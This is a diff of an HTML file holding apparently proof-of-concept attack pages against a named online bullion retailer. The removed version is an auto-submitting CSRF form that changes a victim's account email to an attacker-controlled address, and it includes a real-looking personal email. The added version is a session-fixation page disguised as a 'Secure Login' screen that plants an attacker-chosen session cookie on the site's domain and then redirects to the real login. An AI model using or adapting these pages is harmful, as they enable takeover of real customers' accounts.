@@ -1,25 +1,52 @@
 <!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-
-    <form action="https://silvergoldbull.com/customer/account/editPost/"
-          method="POST"
-          enctype="multipart/form-data">
-
-      <!-- If CSRF exists, these values should NOT be required or should be reusable -->
-      
-      <input type="hidden" name="firstname" value="Muftimandy" />
-      <input type="hidden" name="lastname" value="Mufti2" />
-
-      <!-- Attacker-controlled email -->
-      <input type="hidden" name="email" value="laurazhazira@gmail.com" />
-
-
-
-    </form>
-
-  </body>
+<head>
+    <title>SilverGoldBull - Session Management</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 50px; text-align: center; }
+        .loading { color: #666; margin: 20px; }
+    </style>
+</head>
+<body>
+    <h1>SilverGoldBull Secure Login</h1>
+    <p class="loading">Setting up secure session...</p>
+    
+    <script>
+        // Generate a realistic-looking session ID
+        function generateSessionId() {
+            const timestamp = Date.now().toString(36);
+            const random = Math.random().toString(36).substr(2, 16);
+            return 's' + timestamp + random;
+        }
+        
+        // Attacker's predetermined session ID or generate new one
+        const attackerSessionId = 'aln3fr46qrqjco7n7pj9doteefbcltsd279dn7ht57o813t8egvlpa4gkgibo46b52uitel3kpjbg6tusi682asb0tpfpvh72r99sb8c879mrf8hd1b8v02b020g39lp'; // Or use generateSessionId()
+        
+        // Set ALL cookie attributes to match real session cookie
+        document.cookie = "Frontend=" + attackerSessionId + 
+                         "; expires=Mon, 01 Oct 2057 17:55:10 GMT" +
+                         "; Max-Age=999999999" +
+                         "; path=/" +
+                         "; domain=.silvergoldbull.com" +  // Note: leading dot for subdomains
+                         "; secure" +                       // Only over HTTPS
+                         "; SameSite=None";                 // Allow cross-site
+        
+        // Wait a moment then redirect to real login
+        setTimeout(function() {
+            window.location = "https://silvergoldbull.com /_customer/account/login";
+        }, 1500);
+        
+        // Optional: Show fake loading animation
+        let dots = 0;
+        const loadingInterval = setInterval(function() {
+            dots = (dots + 1) % 4;
+            document.querySelector('.loading').textContent = 
+                'Setting up secure session' + '.'.repeat(dots);
+        }, 300);
+    </script>
+</body>
 </html>
+
 
 
 
